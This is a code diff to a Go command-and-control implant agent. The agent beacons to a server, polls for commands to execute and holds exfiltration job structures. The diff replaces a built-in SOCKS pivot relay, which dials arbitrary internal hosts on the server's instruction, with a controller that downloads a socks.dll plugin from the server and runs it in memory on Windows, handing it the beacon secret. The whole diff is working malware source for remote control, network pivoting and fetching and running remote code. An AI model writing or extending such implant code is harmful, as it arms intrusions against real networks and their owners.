@@ -7,13 +7,13 @@ package main
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
 	"fmt"
 	"io"
 	"math/rand"
-	"net"
 	"net/http"
 	"net/url"
 	"os"
@@ -40,33 +40,6 @@ type commandResponse struct {
 	Command     string `json:"command"`
 	Type        string `json:"type"`
 	SocksActive bool   `json:"socks_active"`
-}
-
-type socksPollResponse struct {
-	Active bool        `json:"active"`
-	Tasks  []socksTask `json:"tasks"`
-}
-
-type socksTask struct {
-	Op      string `json:"op"`
-	ID      string `json:"id"`
-	Host    string `json:"host"`
-	Port    int    `json:"port"`
-	DataB64 string `json:"data_b64"`
-}
-
-type socksResponse struct {
-	ID      string `json:"id"`
-	Op      string `json:"op"`
-	DataB64 string `json:"data_b64,omitempty"`
-	Msg     string `json:"msg,omitempty"`
-}
-
-type socksRelay struct {
-	mu       sync.Mutex
-	active   bool
-	conns    map[string]net.Conn
-	stopping chan struct{}
 }
 
 type exfilJob struct {
@@ -112,8 +85,8 @@ func main() {
 	logf("starting agent for %s", cfg.BaseURL)
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	client := newHTTPClient(cfg)
-	relay := newSocksRelay()
-	go relay.loop(client, cfg)
+	pivot := newSocksPluginController()
+	defer pivot.stop()
 
 	for {
 		if err := register(client, cfg); err != nil {
@@ -125,13 +98,71 @@ func main() {
 			sleepWithJitter(cfg, rng)
 			continue
 		}
-		if err := pollOnce(client, cfg, relay); err != nil {
+		if err := pollOnce(client, cfg, pivot); err != nil {
 			if err.Error() == "session terminated by server" {
 				return
 			}
 			logf("poll failed: %v", err)
 		}
 		sleepWithJitter(cfg, rng)
+	}
+}
+
+// socksPluginController keeps the persistent pivot plugin outside the normal
+// beacon command path. The server-side relay remains the source of truth for
+// its lifetime; the plugin exits after the relay is stopped.
+type socksPluginController struct {
+	mu      sync.Mutex
+	running bool
+	cancel  context.CancelFunc
+}
+
+func newSocksPluginController() *socksPluginController {
+	return &socksPluginController{}
+}
+
+func (p *socksPluginController) syncActive(active bool, client *http.Client, cfg *config) {
+	if runtime.GOOS != "windows" || runtime.GOARCH != "amd64" {
+		return
+	}
+	p.mu.Lock()
+	if active {
+		if p.running {
+			p.mu.Unlock()
+			return
+		}
+		ctx, cancel := context.WithCancel(context.Background())
+		p.running = true
+		p.cancel = cancel
+		p.mu.Unlock()
+		go func() {
+			input, _ := json.Marshal(map[string]string{
+				"base_url":      cfg.BaseURL,
+				"beacon_secret": cfg.BeaconSecret,
+				"session_id":    cfg.SessionID,
+				"http_proxy":    cfg.HTTPProxy,
+			})
+			_, _ = loadPluginPEContext(ctx, client, cfg, "/tools/plugins/socks.dll", "Run", string(input))
+			p.mu.Lock()
+			p.running = false
+			p.cancel = nil
+			p.mu.Unlock()
+		}()
+		return
+	}
+	cancel := p.cancel
+	p.mu.Unlock()
+	if cancel != nil {
+		cancel()
+	}
+}
+
+func (p *socksPluginController) stop() {
+	p.mu.Lock()
+	cancel := p.cancel
+	p.mu.Unlock()
+	if cancel != nil {
+		cancel()
 	}
 }
 
@@ -178,7 +209,7 @@ func register(client *http.Client, cfg *config) error {
 	v.Set("sync", "1")
 	v.Set("agent", "go")
 	if runtime.GOOS == "windows" && runtime.GOARCH == "amd64" {
-		v.Set("caps", "pe,rclone-plugin")
+		v.Set("caps", "pe,rclone-plugin,socks-plugin")
 	} else {
 		v.Set("caps", "")
 	}
@@ -186,7 +217,7 @@ func register(client *http.Client, cfg *config) error {
 	return err
 }
 
-func pollOnce(client *http.Client, cfg *config, relay *socksRelay) error {
+func pollOnce(client *http.Client, cfg *config, pivot *socksPluginController) error {
 	data, err := request(client, cfg, http.MethodGet, "/cmd", values(cfg), nil)
 	if err != nil {
 		return err
@@ -195,7 +226,7 @@ func pollOnce(client *http.Client, cfg *config, relay *socksRelay) error {
 	if err := json.Unmarshal(data, &reply); err != nil {
 		return err
 	}
-	relay.setActive(reply.SocksActive)
+	pivot.syncActive(reply.SocksActive, client, cfg)
 	if strings.TrimSpace(reply.Command) == "" {
 		_ = register(client, cfg)
 		return nil
@@ -226,134 +257,6 @@ func newHTTPClient(cfg *config) *http.Client {
 		}
 	}
 	return &http.Client{Timeout: 90 * time.Second, Transport: transport}
-}
-
-func newSocksRelay() *socksRelay {
-	return &socksRelay{conns: make(map[string]net.Conn), stopping: make(chan struct{})}
-}
-
-func (r *socksRelay) setActive(active bool) {
-	r.mu.Lock()
-	wasActive := r.active
-	r.active = active
-	if !active && wasActive {
-		for id, conn := range r.conns {
-			_ = conn.Close()
-			delete(r.conns, id)
-		}
-	}
-	r.mu.Unlock()
-}
-
-func (r *socksRelay) loop(client *http.Client, cfg *config) {
-	ticker := time.NewTicker(25 * time.Millisecond)
-	defer ticker.Stop()
-	for {
-		select {
-		case <-ticker.C:
-			r.mu.Lock()
-			active := r.active
-			r.mu.Unlock()
-			if active {
-				r.cycle(client, cfg)
-			}
-		case <-r.stopping:
-			return
-		}
-	}
-}
-
-func (r *socksRelay) cycle(client *http.Client, cfg *config) {
-	data, err := request(client, cfg, http.MethodGet, "/socks", values(cfg), nil)
-	if err != nil {
-		return
-	}
-	var poll socksPollResponse
-	if json.Unmarshal(data, &poll) != nil {
-		return
-	}
-	if !poll.Active {
-		r.setActive(false)
-		return
-	}
-	responses := make([]socksResponse, 0)
-	for _, task := range poll.Tasks {
-		if task.ID == "" {
-			continue
-		}
-		switch task.Op {
-		case "connect":
-			conn, err := net.DialTimeout("tcp", net.JoinHostPort(task.Host, strconv.Itoa(task.Port)), 20*time.Second)
-			if err != nil {
-				responses = append(responses, socksResponse{ID: task.ID, Op: "error", Msg: err.Error()})
-				continue
-			}
-			conn.(*net.TCPConn).SetNoDelay(true)
-			r.mu.Lock()
-			if old := r.conns[task.ID]; old != nil {
-				_ = old.Close()
-			}
-			r.conns[task.ID] = conn
-			r.mu.Unlock()
-			responses = append(responses, socksResponse{ID: task.ID, Op: "ok"})
-		case "send":
-			r.mu.Lock()
-			conn := r.conns[task.ID]
-			r.mu.Unlock()
-			if conn == nil {
-				continue
-			}
-			raw, decodeErr := base64.StdEncoding.DecodeString(task.DataB64)
-			_, writeErr := conn.Write(raw)
-			if decodeErr != nil || writeErr != nil {
-				r.close(task.ID)
-				responses = append(responses, socksResponse{ID: task.ID, Op: "closed"})
-			}
-		case "close":
-			r.close(task.ID)
-		}
-	}
-	for id, conn := range r.snapshot() {
-		for i := 0; i < 4; i++ {
-			_ = conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
-			buf := make([]byte, 16*1024)
-			n, readErr := conn.Read(buf)
-			if n > 0 {
-				responses = append(responses, socksResponse{ID: id, Op: "data", DataB64: base64.StdEncoding.EncodeToString(buf[:n])})
-			}
-			if readErr != nil {
-				if errors.Is(readErr, os.ErrDeadlineExceeded) {
-					break
-				}
-				r.close(id)
-				responses = append(responses, socksResponse{ID: id, Op: "closed"})
-				break
-			}
-		}
-	}
-	if len(responses) > 0 {
-		body, _ := json.Marshal(map[string]any{"responses": responses})
-		_, _ = request(client, cfg, http.MethodPost, "/socks", values(cfg), body)
-	}
-}
-
-func (r *socksRelay) snapshot() map[string]net.Conn {
-	r.mu.Lock()
-	defer r.mu.Unlock()
-	out := make(map[string]net.Conn, len(r.conns))
-	for id, conn := range r.conns {
-		out[id] = conn
-	}
-	return out
-}
-
-func (r *socksRelay) close(id string) {
-	r.mu.Lock()
-	defer r.mu.Unlock()
-	if conn := r.conns[id]; conn != nil {
-		_ = conn.Close()
-		delete(r.conns, id)
-	}
 }
 
 func execute(command string, cfg *config, client *http.Client) (string, string) {
